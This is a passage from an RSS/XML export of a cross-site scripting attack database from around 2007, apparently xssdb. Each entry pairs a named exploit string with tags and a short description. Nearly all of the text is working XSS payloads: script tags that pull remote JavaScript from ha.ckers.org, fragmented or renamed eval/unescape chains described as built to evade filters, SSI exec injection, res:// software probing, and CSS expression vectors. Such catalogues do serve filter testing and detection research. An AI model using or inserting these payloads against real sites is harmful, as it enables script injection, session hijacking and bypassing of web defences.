this set up properly.</ddb:exploitDescription>      <ddb:exploitName>Removing Cnames</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>Rename .js to .jpg</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1920</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Rename .js to .jpg&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Assuming you can only fit in a few characters and it filters against ”.js” you can rename your JavaScript file to an image as an XSS vector.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:17:32 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Assuming you can only fit in a few characters and it filters against ”.js” you can rename your JavaScript file to an image as an XSS vector.</ddb:exploitDescription>      <ddb:exploitName>Rename .js to .jpg</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>res:// installed software probing</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2013</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;res:// installed software probing&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This res-uri can be used to probe for certain software in IE.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;URI exploits, injection, general, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;xs-sniper</description>      <pubDate>Tue, 24 Jul 07 10:35:24 -0400</pubDate>      <ddb:authorName>xs-sniper</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This res-uri can be used to probe for certain software in IE.</ddb:exploitDescription>      <ddb:exploitName>res:// installed software probing</ddb:exploitName>      <ddb:exploitString>res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210</ddb:exploitString>      <ddb:exploitTags>URI exploits, injection, general, obfuscated, internet explorer</ddb:exploitTags>    </item>    <item>      <title>SCRIPT w/Alert()</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1867</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;SCRIPT w/Alert()&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Basic injection attack&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, basic&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:17:43 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Basic injection attack</ddb:exploitDescription>      <ddb:exploitName>SCRIPT w/Alert()</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, basic</ddb:exploitTags>    </item>    <item>      <title>SCRIPT w/Char Code</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1869</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;SCRIPT w/Char Code&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word ”XSS” will pop up.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, basic&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:18:16 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word ”XSS” will pop up.</ddb:exploitDescription>      <ddb:exploitName>SCRIPT w/Char Code</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, basic</ddb:exploitTags>    </item>    <item>      <title>SCRIPT w/Source File</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1868</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;SCRIPT w/Source File&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;No filter evasion. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, basic, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:18:29 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>No filter evasion. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here).</ddb:exploitDescription>      <ddb:exploitName>SCRIPT w/Source File</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, basic, injection</ddb:exploitTags>    </item>    <item>      <title>Self-contained XSS variant 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1855</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Self-contained XSS variant 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Concatenates obfuscated eval() and substr() to be called on location.hash&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, self contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Concatenates obfuscated eval() and substr() to be called on location.hash</ddb:exploitDescription>      <ddb:exploitName>Self-contained XSS variant 1</ddb:exploitName>      <ddb:exploitString>a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))</ddb:exploitString>      <ddb:exploitTags>general, self contained</ddb:exploitTags>    </item>    <item>      <title>Self-contained XSS variant 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1854</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Self-contained XSS variant 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Concatenates fragmented functions to evakuate the location hash&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, self contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Concatenates fragmented functions to evakuate the location hash</ddb:exploitDescription>      <ddb:exploitName>Self-contained XSS variant 2</ddb:exploitName>      <ddb:exploitString>a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))</ddb:exploitString>      <ddb:exploitTags>general, self contained</ddb:exploitTags>    </item>    <item>      <title>Self-contained XSS variant 3</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1853</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Self-contained XSS variant 3&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;eval.call(this,unescape.call(this,location))&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Uses call() and eval() to access the payload in the fragment identifier&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, self contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Uses call() and eval() to access the payload in the fragment identifier</ddb:exploitDescription>      <ddb:exploitName>Self-contained XSS variant 3</ddb:exploitName>      <ddb:exploitString>eval.call(this,unescape.call(this,location))</ddb:exploitString>      <ddb:exploitTags>general, self contained</ddb:exploitTags>    </item>    <item>      <title>Self-contained XSS variant 4</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1852</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Self-contained XSS variant 4&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This one is pretty hard to detect due to the total fragmentation. Fragments are built together to a self-executing function.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, self contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This one is pretty hard to detect due to the total fragmentation. Fragments are built together to a self-executing function.</ddb:exploitDescription>      <ddb:exploitName>Self-contained XSS variant 4</ddb:exploitName>      <ddb:exploitString>d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))</ddb:exploitString>      <ddb:exploitTags>general, self contained</ddb:exploitTags>    </item>    <item>      <title>Self-contained XSS variant 5</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1851</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Self-contained XSS variant 5&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This variant has the function fragments shuffled to evade concatenation filters and is thus very hard to detect.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, self contained, shuffled&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This variant has the function fragments shuffled to evade concatenation filters and is thus very hard to detect.</ddb:exploitDescription>      <ddb:exploitName>Self-contained XSS variant 5</ddb:exploitName>      <ddb:exploitString>l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a</ddb:exploitString>      <ddb:exploitTags>general, self contained, shuffled</ddb:exploitTags>    </item>    <item>      <title>Self-contained XSS variant 6</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1850</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Self-contained XSS variant 6&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;_=eval,__=unescape,___=document.URL,_(__(___))&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Since Javascript allows \w+ as variable name - this vector uses _ to evade filters.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, self contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Since Javascript allows \w+ as variable name - this vector uses _ to evade filters.</ddb:exploitDescription>      <ddb:exploitName>Self-contained XSS variant 6</ddb:exploitName>      <ddb:exploitString>_=eval,__=unescape,___=document.URL,_(__(___))</ddb:exploitString>      <ddb:exploitTags>general, self contained</ddb:exploitTags>    </item>    <item>      <title>Self-contained XSS variant 7</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1848</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Self-contained XSS variant 7&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Uses special characters as variable names and self-executes the concatenated payload trigger.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, self contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Uses special characters as variable names and self-executes the concatenated payload trigger.</ddb:exploitDescription>      <ddb:exploitName>Self-contained XSS variant 7</ddb:exploitName>      <ddb:exploitString>$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)</ddb:exploitString>      <ddb:exploitTags>general, self contained</ddb:exploitTags>    </item>    <item>      <title>Self-contained XSS variant 8</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1847</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Self-contained XSS variant 8&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This time $ is used to obfuscate the self-executing payload trigger.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, self contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This time $ is used to obfuscate the self-executing payload trigger.</ddb:exploitDescription>      <ddb:exploitName>Self-contained XSS variant 8</ddb:exploitName>      <ddb:exploitString>$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))</ddb:exploitString>      <ddb:exploitTags>general, self contained</ddb:exploitTags>    </item>    <item>      <title>Self-contained XSS variant 9</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1845</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Self-contained XSS variant 9&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7[evil](cod)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This more than sophisticated vector is hard to explain - it' creator did here: http://sla.ckers.org/forum/read.php?2,13209,page=2#msg-13409&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, self contained, shuffled&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This more than sophisticated vector is hard to explain - it' creator did here: http://sla.ckers.org/forum/read.php?2,13209,page=2#msg-13409</ddb:exploitDescription>      <ddb:exploitName>Self-contained XSS variant 9</ddb:exploitName>      <ddb:exploitString>evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7[evil](cod)</ddb:exploitString>      <ddb:exploitTags>general, self contained, shuffled</ddb:exploitTags>    </item>    <item>      <title>Self-containing XSS with no dots</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2045</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Self-containing XSS with no dots&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;with(location)with(hash)eval(substring(1))&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector uses with() to activate the payload behind the fragment identifier. No dots are used to enable easier filter evasion.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, super short, self contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ma1</description>      <pubDate>Fri, 03 Aug 07 09:19:39 -0400</pubDate>      <ddb:authorName>ma1</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector uses with() to activate the payload behind the fragment identifier. No dots are used to enable easier filter evasion.</ddb:exploitDescription>      <ddb:exploitName>Self-containing XSS with no dots</ddb:exploitName>      <ddb:exploitString>with(location)with(hash)eval(substring(1))</ddb:exploitString>      <ddb:exploitTags>general, super short, self contained</ddb:exploitTags>    </item>    <item>      <title>Spaces/Meta Chars</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1944</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Spaces/Meta Chars&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&quot; &amp;#14;  javascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word ”javascript:” - which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the ”javascript:” keyword. The actual reality is you can have any char from 1-32 in decimal).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:26:56 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word ”javascript:” - which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the ”javascript:” keyword. The actual reality is you can have any char from 1-32 in decimal).</ddb:exploitDescription>      <ddb:exploitName>Spaces/Meta Chars</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&quot; &amp;#14;  javascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, internet explorer</ddb:exploitTags>    </item>    <item>      <title>SSI</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1921</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;SSI&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;!--#exec cmd=&quot;/bin/echo '&lt;SCRIPT SRC'&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo '=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'&quot;--&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;SSI (Server Side Includes) requires SSI to be installed on the server to use this XSS vector.  I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, SSI, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:18:44 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>SSI (Server Side Includes) requires SSI to be installed on the server to use this XSS vector.  I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues.</ddb:exploitDescription>      <ddb:exploitName>SSI</ddb:exploitName>      <ddb:exploitString>&lt;!--#exec cmd=&quot;/bin/echo '&lt;SCRIPT SRC'&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo '=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'&quot;--&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, SSI, injection</ddb:exploitTags>    </item>    <item>      <title>STYLE</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1900</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;STYLE&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert('XSS');&lt;/STYLE&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;STYLE tag (Older versions of Netscape only)&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, style injection, gecko&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:19:32 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>STYLE tag (Older versions of Netscape only)</ddb:exploitDescription>      <ddb:exploitName>STYLE</ddb:exploitName>      <ddb:exploitString>&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert('XSS');&lt;/STYLE&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, style injection, gecko</ddb:exploitTags>    </item>    <item>      <title>Style injection via content and double-eval</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=13159</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Style injection via content and double-eval&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;style&gt;&lt;br&gt;body:after{&lt;br&gt;content: “\61\6c\65\72\74\28\31\29″&lt;br&gt;}&lt;br&gt;&lt;/style&gt;&lt;br&gt;&lt;script&gt;&lt;br&gt;eval(eval(document.styleSheets[0].cssRules[0].style.content))&lt;br&gt;&lt;/script&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilizes the CSS content property and fetches it off the document.styleSheets property afterwards. For correct execution of the payload a double-eval is needed. &lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, onfuscated, style injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Wed, 21 Nov 07 09:49:27 -0500</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilizes the CSS content property and fetches it off the document.styleSheets property afterwards. For correct execution of the payload a double-eval is needed. </ddb:exploitDescription>      <ddb:exploitName>Style injection via content and double-eval</ddb:exploitName>      <ddb:exploitString>&lt;style&gt;&#13;&#10;body:after{&#13;&#10;content: “\61\6c\65\72\74\28\31\29″&#13;&#10;}&#13;&#10;&lt;/style&gt;&#13;&#10;&lt;script&gt;&#13;&#10;eval(eval(document.styleSheets[0].cssRules[0].style.content))&#13;&#10;&lt;/script&gt;</ddb:exploitString>      <ddb:exploitTags>general, onfuscated, style injection</ddb:exploitTags>    </item>    <item>      <title>STYLE w/Anonymous HTML</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1902</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;STYLE w/Anonymous HTML&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;XSS STYLE=&quot;xss:expression(alert('XSS'))&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Anonymous HTML with STYLE attribute (IE and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter)&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:19:43 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Anonymous HTML with STYLE attribute (IE and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter)</ddb:exploitDescription>      <ddb:exploitName>STYLE w/Anonymous HTML</ddb:exploitName>      <ddb:exploitString>&lt;XSS STYLE=&quot;xss:expression(alert('XSS'))&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, internet explorer</ddb:exploitTags>    </item>    <item>      <title>STYLE w/background</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1904</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;STYLE w/background&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert('XSS')&quot;)}&lt;/STYLE&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;STYLE tag using background.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, injection, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:46:37 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>STYLE tag using background.</ddb:exploitDescription>      <ddb:exploitName>STYLE w/background</ddb:exploitName>      <ddb:exploitString>&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert('XSS')&quot;)}&lt;/STYLE&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, injection, internet explorer</ddb:exploitTags>    </item>    <item>      <title>STYLE w/background-image</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1903</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;STYLE w/background-image&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;STYLE tag using background-image.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer, style injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:20:03 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>STYLE tag using background-image.</ddb:exploitDescription>      <ddb:exploitName>STYLE w/background-image</ddb:exploitName>      <ddb:exploitString>&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer, style injection</ddb:exploitTags>    </item>    <item>      <title>STYLE w/broken up JavaScript</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1936</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;STYLE w/broken up JavaScript&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert(&quot;XSS&quot;)';&lt;/STYLE&gt;&lt;br&gt;&lt;b&gt;Exploit Description: 